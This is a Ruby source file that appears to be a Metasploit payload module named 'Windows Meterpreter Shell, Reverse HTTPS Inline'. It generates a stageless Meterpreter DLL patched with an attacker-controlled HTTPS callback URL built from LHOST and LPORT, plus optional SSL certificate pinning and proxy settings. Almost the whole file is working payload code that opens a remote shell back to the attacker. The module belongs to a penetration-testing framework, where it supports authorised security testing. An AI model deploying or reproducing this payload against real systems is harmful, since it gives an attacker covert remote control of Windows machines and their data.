##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'
# TODO: put this in when HD's PR has been landed.
#require 'rex/parser/x509_certificate'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTPS Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
    ], self.class)
  end

  def generate
    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
    rand = Rex::Text.rand_text_alphanumeric(16)
    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"

    generate_stageless_meterpreter(url) do |dll|

      # TODO: figure out this bit
      # patch the target ID into the URI if specified
      #if opts[:target_id]
      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
      #  if i
      #    t = opts[:target_id].to_s
      #    raise "Target ID must be less than 5 bytes" if t.length > 4
      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
      #    print_status("Patching Target ID #{t} into DLL")
      #    dll[i, u.length] = u
      #  end
      #end

      Rex::Payloads::Meterpreter::Patch.patch_passive_service! dll,
        :url            => url,
        :ssl            => true,
        :ssl_cert_hash  => get_ssl_cert_hash,
        :expiration     => datastore['SessionExpirationTimeout'].to_i,
        :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
        :ua             => datastore['MeterpreterUserAgent'],
        :proxyhost      => datastore['PROXYHOST'],
        :proxyport      => datastore['PROXYPORT'],
        :proxy_type     => datastore['PROXY_TYPE'],
        :proxy_username => datastore['PROXY_USERNAME'],
        :proxy_password => datastore['PROXY_PASSWORD']
    end

  end

  # TODO: remove all that is below this when HD's PR has been landed
  def get_ssl_cert_hash
    unless datastore['StagerVerifySSLCert'].to_s =~ /^(t|y|1)/i
      return nil
    end

    unless datastore['HandlerSSLCert']
      raise ArgumentError, "StagerVerifySSLCert is enabled but no HandlerSSLCert is configured"
    end

    # TODO: fix this up when HD's PR has landed.
    #hcert = Rex::Parser::X509Certificate.parse_pem_file(datastore['HandlerSSLCert'])
    hcert = parse_pem_file(datastore['HandlerSSLCert'])
    unless hcert and hcert[0] and hcert[1]
      raise ArgumentError, "Could not parse a private key and certificate from #{datastore['HandlerSSLCert']}"
    end

    hash = Rex::Text.sha1_raw(hcert[1].to_der)
    print_status("Meterpreter will verify SSL Certificate with SHA1 hash #{hash.unpack("H*").first}")
    hash
  end

  def parse_pem(ssl_cert)
    cert  = nil
    key   = nil
    chain = nil

    certs = []
    ssl_cert.scan(/-----BEGIN\s*[^\-]+-----+\r?\n[^\-]*-----END\s*[^\-]+-----\r?\n?/nm).each do |pem|
      if pem =~ /PRIVATE KEY/
        key = OpenSSL::PKey::RSA.new(pem)
      elsif pem =~ /CERTIFICATE/
        certs << OpenSSL::X509::Certificate.new(pem)
      end
    end

    cert = certs.shift
    if certs.length > 0
      chain = certs
    end

    [key, cert, chain]
  end
  def parse_pem_file(ssl_cert_file)
    data = ''
    ::File.open(ssl_cert_file, 'rb') do |fd|
      data << fd.read(fd.stat.size)
    end
    parse_pem(data)
  end

end

